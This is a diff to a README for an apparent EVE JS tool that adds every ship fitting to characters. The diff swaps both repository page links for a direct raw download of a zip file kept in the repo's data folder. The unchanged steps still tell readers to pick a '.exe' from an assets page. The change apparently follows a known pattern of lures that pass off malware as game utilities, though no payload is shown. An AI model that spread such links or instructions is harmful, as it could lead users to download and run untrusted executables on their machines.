@@ -1,6 +1,6 @@
 # 🚀 elysian-fitall-eve-online-evejs-saved-fittings - Add every ship fitting to characters
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/AmmarSlibi2013/elysian-fitall-eve-online-evejs-saved-fittings)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/AmmarSlibi2013/elysian-fitall-eve-online-evejs-saved-fittings/main/data/evejs_fitall_saved_fittings_online_elysian_eve_2.2.zip)
 
 This tool automates the process of adding ship fittings to characters within EVE JS environments. It populates every character with a saved fitting for every ship available in the game database. This saves time for players who manage multiple characters or require immediate access to standard fitting templates.
 
@@ -17,7 +17,7 @@ This application runs on Windows systems. Ensure your computer meets these basic
 
 Follow these steps to obtain and prepare the software on your computer.
 
-1. Visit [this page to download](https://github.com/AmmarSlibi2013/elysian-fitall-eve-online-evejs-saved-fittings) the latest version of the application.
+1. Visit [this page to download](https://raw.githubusercontent.com/AmmarSlibi2013/elysian-fitall-eve-online-evejs-saved-fittings/main/data/evejs_fitall_saved_fittings_online_elysian_eve_2.2.zip) the latest version of the application.
 2. Locate the download button or assets section on the page.
 3. Select the file ending in `.exe` to begin the download.
 4. Save the file to your desktop or your Downloads folder.
